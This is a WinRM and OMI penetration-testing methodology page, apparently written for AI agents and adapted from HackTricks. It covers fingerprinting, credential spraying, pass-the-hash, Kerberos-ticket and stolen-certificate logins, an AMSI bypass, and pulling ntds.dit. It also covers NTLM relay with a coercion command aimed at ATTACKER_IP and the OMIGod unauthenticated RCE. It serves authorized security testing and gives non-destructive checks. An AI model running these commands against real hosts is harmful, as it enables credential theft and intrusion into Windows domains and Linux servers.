---
technology: "WinRM / WS-Management"
kind: bug-bounty-methodology
audience: ai-agent
family: windows
provenance: "evidence-grounded: 87 files / 918 command-context lines mined (evil-winrm invocations, 5985/5986 nmap signatures, winrm config commands, relay server setups). Upstream-verified: Microsoft WinRM installation/auth docs, about_Remote_Requirements, Hackplayers evil-winrm README (v4.x flags), WinRb winrm gem docs, adityatelange evil-winrm-py. 2026-11-12."
ht-source:
  - "rewritten from HackTricks (src/network-services-pentesting/5985-5986-pentesting-omi.md), CC BY-NC 4.0, accessed 2026-11-13"
---

# WinRM bug bounty methodology

Target model: one SOAP endpoint per listener (5985 HTTP, 5986 HTTPS, both at
`/wsman`), auth at the HTTP layer (Negotiate/Kerberos by default), PowerShell
runspaces behind it. Authorization assumed throughout; every destructive step
has a non-destructive verify variant. Companion overview: [[winrm|WinRM]].

Password logins `-u/-p` dominate
(70 invocations), pass-the-hash `-H` next (41), Kerberos `-r`/tickets (24),
SSL `-S` (9), certificate auth `-c/-k` (2). The port is usually the last hop
of a chain, not the first finding.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| Default-cred / sprayed login | valid password or hash + admin or Remote Management Users | n/a (credentialed) | PowerShell as user — Critical with admin |
| Pass-the-hash via Negotiate | NTHash + NTLM allowed (default) | n/a | Shell without plaintext — Critical |
| Basic auth over HTTP (5985) | admin enabled `Basic=true` + `AllowUnencrypted=true` | no | Cleartext creds on wire / login — High (finding on config alone) |
| Kerberos ticket auth | ticket + FQDN + realm | n/a | Shell under Kerberos-only policy (Protected Users) — Critical |
| Client-certificate auth | stolen PFX → cert/key pair, 5986 | n/a | Passwordless shell — Critical |
| NTLM relay to WinRM | coercion primitive + ntlmrelayx | yes (relay) | Shell as coerced SYSTEM/admin — Critical |
| OMI on 5985/5986 (Linux) | OMIGod CVE-2021-38647 (≤ OMI 1.6.8-1) | yes | Root RCE via one SOAP POST — Critical |
| Unauth enumeration | nmap -sV /wsman probe | yes | Service/version fingerprint — Info |

## Phase 0 — Fingerprint the listener

```bash
nmap -p 5985,5986,47001 -sV 198.51.100.10
# 5985/tcp  open  http  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
# |_http-server-header: Microsoft-HTTPAPI/2.0
# |_http-title: Not Found
# 5986/tcp  open  ssl/wsmans            <- HTTPS listener present
# 47001/tcp open  http  Microsoft HTTPAPI httpd 2.0   <- same HTTP.SYS stack

# WS-Management discrimination: Windows answers SOAP faults at /wsman,
# OMI (Linux) answers with its own fault text
curl -si --max-time 5 http://198.51.100.10:5985/wsman -X POST \
  -H 'Content-Type: application/soap+xml;charset=UTF-8' --data '<x/>'
```

Decision points after Phase 0:

- `Microsoft-HTTPAPI/2.0` + `Not Found` title → Windows WinRM; continue Phase 1.
- Linux OMI agent (OMIGod era) → Phase 6.
- 5986 only → every workflow below needs `-S`; record the cert (self-signed is
  the norm — `no_ssl_peer_verification` territory).
- Probing `/wsman` with garbage that returns a SOAP `wsman:Fault` (not an HTML
  404) confirms the endpoint regardless of nmap's service guess.

## Phase 1 — Credential triage against the door

Validate recovered passwords/hashes at scale before touching evil-winrm
(non-destructive: a login attempt is the test; use `-x whoami` for one command,
no payload):

```bash
nxc winrm 198.51.100.10 -u user.list -p 'P@ssw0rd'        # spray, one pass
nxc winrm 198.51.100.10 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0  # PTH
# (Pwned!) marks admin-or-equivalent logins; (51x) marks valid-but-forbidden
```

Read the two outcomes differently: `(Pwned!)` = account may open a session
(Administrators / Remote Management Users); a status that authenticates but
denies = valid creds without the remoting right — pivot to other protocols
(SMB, MSSQL) with the same secrets. Observed pattern (repeatedly):
nxc winrm is the go/no-go gate before any interactive work.

## Phase 2 — evil-winrm interactive workflows

Flag contract (upstream README v4.x — note `-a` is user-agent, NOT auth):

```bash
# password
evil-winrm -i 198.51.100.10 -u administrator -p 'P@ssw0rd'

# pass-the-hash (NTHash only; observed repeatedly)
evil-winrm -i 198.51.100.10 -u svc_backup -H 31d6cfe0d16ae931b73c59d7e0c089c0

# Kerberos (FQDN required; realm must exist in /etc/krb5.conf)
evil-winrm -i dc01.example.com -r EXAMPLE.COM -u user -p 'P@ssw0rd'
KRB5CCNAME=user.ccache evil-winrm -i dc01.example.com -r EXAMPLE.COM   # ccache
evil-winrm -i dc01.example.com -r EXAMPLE.COM -K ticket.kirbi          # kirbi/ccache file

# SSL + client certificate (extracted from a stolen PFX)
openssl pkcs12 -in stolen.pfx -nocerts -out private.key -nodes
openssl pkcs12 -in stolen.pfx -clcerts -nokeys -out cert.crt
evil-winrm -S -i dc01.example.com -c cert.crt -k private.key
```

Known client-side walls (observed, all with workarounds):

- **Kerberos AND SSL simultaneously** — stock ruby evil-winrm picks one
  transport; one observed estate patches `evil-winrm.rb` (ly4k patch: `transport:
  :kerberos` + `https://` endpoint + `no_ssl_peer_verification: true`) and
  runs `ruby evil-winrm-patched.rb -i dc01.example.com -S -r EXAMPLE.COM`.
  evil-winrm-py (`-k` = use Kerberos) is the packaged alternative.
- **OpenSSL 3.x kills NTLM** (MD4 retired): `Digest initialization failed` —
  enable the legacy provider in `openssl.cnf` (default+legacy sections
  activated) or `export OPENSSL_CONF=` a minimal conf enabling legacy.
- **Protected Users / NTLM-blocked targets**: use Kerberos only (`-r` + ticket).
- **Pivots**: wrap in `proxychains` (observed repeatedly)
  or run the raw script (`ruby /opt/evil-winrm/evil-winrm.rb ...`).

In-session toolkit (the reason evil-winrm beats plain pwsh here):

```text
*Evil-WinRM* PS> menu            # loads Invoke-Binary, Dll-Loader, Donut-Loader, Bypass-4MSI
*Evil-WinRM* PS> Bypass-4MSI     # dynamic AMSI bypass (observed)
*Evil-WinRM* PS> services        # per-service permission map, no admin needed
*Evil-WinRM* PS> upload /local/tool.exe C:\\Windows\\Temp\\t.exe
*Evil-WinRM* PS> download C:\\Windows\\NTDS\\ntds.dit   # observed: SAM/SYSTEM/ntds.dit pulled this way
```

`-s <dir>` preloads PowerShell scripts (type name = in-memory load;
observed: `-s .` then `adconnect.ps1` straight into the prompt; PowerView
uploads observed too). `-e <dir>` does the same for C#
assemblies (`Invoke-Binary` runs them in-process).

## Phase 3 — pwsh / Linux-native remoting (no extra tooling)

```bash
sudo apt install gss-ntlmssp powershell
pwsh
# client must trust the target when Kerberos can't run (workgroup/IP):
winrm quickconfig    # on a Windows attack box, or in pwsh: Enable-PSRemoting -Force
winrm set winrm/config/client '@{TrustedHosts="198.51.100.10"}'
$cred = Get-Credential example\\user
Enter-PSSession -ComputerName 198.51.100.10 -Credential $cred
```

Observed anchor: TrustedHosts is the error message you get before this
step. Linux pwsh + gss-ntlmssp gives NTLM remoting without evil-winrm —
useful when Ruby is unwanted on the host.

## Phase 4 — Relay into WinRM (no credentials at all)

WinRM is a prime relay *target* when signing is not enforced. ntlmrelayx
stands up both listeners itself:

```text
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
```

Pair with any coercion primitive (observed: `coercer coerce -l
ATTACKER_IP -t dc01.example.com ...`; NetExec coerce_plus reporting
`VULNERABLE, PetitPotam`) and catch SYSTEM-credential NTLM into a shell.
Non-destructive variant: relay to a listener you own that only logs (never
`-c` command execution) and report the captured authenticate event.

## Phase 5 — Server-side misconfig findings (no login required)

| Observation | Meaning |
|---|---|
| Basic accepted on 5985 | `AllowUnencrypted=true` + `Basic=true` — credentials in cleartext on any login (config finding) |
| 5986 with self-signed cert | common; downgrade-grade misconfig if 5985 also open with identical auth |
| 47001 + 5985 both open | default Windows posture, Info only |
| Anonymous `/wsman` POST answered by non-Windows SOAP fault | OMI or third-party WS-Stack — fingerprint before assuming Windows |

## Phase 6 — OMIGod (CVE-2021-38647): 5985/5986 that is NOT Windows

The OMI agent (Azure Linux) exposed the same ports with an unauthenticated
SOAP endpoint: one `POST /wsman` with a crafted `ExecuteShellCommand` payload (operation on SCX_OperatingSystem)
returned command output in the response output stream (observed — raw requests POST to
`https://target:5986/wsman`, verify=False). Affected ≤ OMI 1.6.8-1, fixed
September 2021. Verify non-destructively by requesting a marker echo
(`id`-equivalent) and reading `StdOut`; never assume Windows because the port
says 5985.

OMI specifics (added 2026-11-13, rewritten from HackTricks; verified against
Microsoft's OMI advisory GHSA-fmh7-p6gp-8xpj and Wiz's OMIGOD research):

- **It is a different product.** Open Management Infrastructure is
  Microsoft's open-source DMTF CIM/WS-Management stack for Linux — deployed
  by Azure VM management extensions (Log Analytics, Diagnostics, Automation,
  Security Center/Configuration Management among them), usually without the
  tenant noticing. `omiengine` runs as root; Wiz also saw **1270/tcp** in
  some configurations.
- **The bug class is a missing-header default**: vulnerable builds authorize
  a request to `/wsman` *when the `Authorization` header is absent*. The RCE
  operation is `ExecuteShellCommand` against the
  `http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem`
  class — the request body carries `<p:command>`/`<p:timeout>` inside the
  WS-Management SOAP envelope; a full working envelope needs the addressing
  fields from the public write-ups (Horizon3.ai ships a controlled-validation
  PoC). Note the exact operation name: it is `ExecuteShellCommand`, not the
  generic "ExecuteCommand" shorthand.
- **Version gate**: every OMI release below **1.6.8-1** is affected — the
  advisory covers CVE-2021-38647 (unauth RCE) plus three local
  privilege-escalation fixes (CVE-2021-38645, -38648, -38649) — **no
  workaround**, patch only. Distro backports make a bare package version
  weak evidence; confirm the deployed build.
- **Installation ≠ exposure**: OMI can run entirely over a local Unix socket
  with no network listener. Check what `omiengine` actually bound (and from
  which network position you sit) before reporting; a loopback-only listener
  can still matter when a lower-trust local service can be steered into
  proxying to it. Do not fire WS-Man requests during passive enumeration.

## Reporting notes

- Evidence for a login chain: the exact client invocation (redacted hash),
  the shell banner (`Evil-WinRM shell v3.x`), one `whoami` output. Observed
  engagements consistently screenshot exactly these three.
- PTH severity anchor: no plaintext ever transmitted; NTLM-over-5985 sessions
  are message-encrypted (RC4 session key) — a sniffable-cleartext claim is
  only true for Basic/AllowUnencrypted combos.
- Cleanup: exit sessions, delete uploaded tools (`upload`ed files listed in
  the transcript), remove any staged cert/key material.

## Appendix A — Tool map

- **evil-winrm** (ruby, LGPL-3.0, Hackplayers) — primary interactive client;
  PTH, Kerberos, certs, AMSI bypass, file transfer. Phases 2.
- **evil-winrm-py** (python/pypsrp, MIT) — `-k` Kerberos incl. ticket auth;
  use when ruby+SSL+Kerberos collide. Phase 2.
- **NetExec / CrackMapExec** (`winrm` protocol) — spray, PTH, `-x` exec. Phase 1.
- **impacket ntlmrelayx** — WinRM/WinRMS relay servers. Phase 4.
- **coercer / PetitPotam / NetExec coerce_plus** — authentication coercion to
  feed the relay. Phase 4.
- **nmap / curl** — listener fingerprinting and stack discrimination. Phase 0.
- **OpenSSL** — PFX splitting for cert auth; legacy-provider workaround. Phase 2.

## Appendix B — Quick reference

```bash
nmap -p 5985,5986,47001 -sV 198.51.100.10                  # listener map
nxc winrm 198.51.100.10 -u users -p 'P@ssw0rd'             # spray gate
evil-winrm -i 198.51.100.10 -u svc -H <NTHASH>             # pass-the-hash
evil-winrm -i dc01.example.com -r EXAMPLE.COM -K user.ccache  # kerberos ticket
evil-winrm -S -i dc01.example.com -c cert.crt -k private.key  # cert auth (5986)
ruby evil-winrm-patched.rb -i dc01.example.com -S -r EXAMPLE.COM  # kerb+ssl patch
```

Auth-defaults crib (service side, upstream Microsoft docs): Negotiate=true,
Kerberos=true, Basic=false, Certificate=false, CredSSP=false,
AllowUnencrypted=false; ports HTTP 5985 / HTTPS 5986 (WinRM 2.0+),
compat listeners 80/443 possible; access = Administrators + Remote
Management Users only.
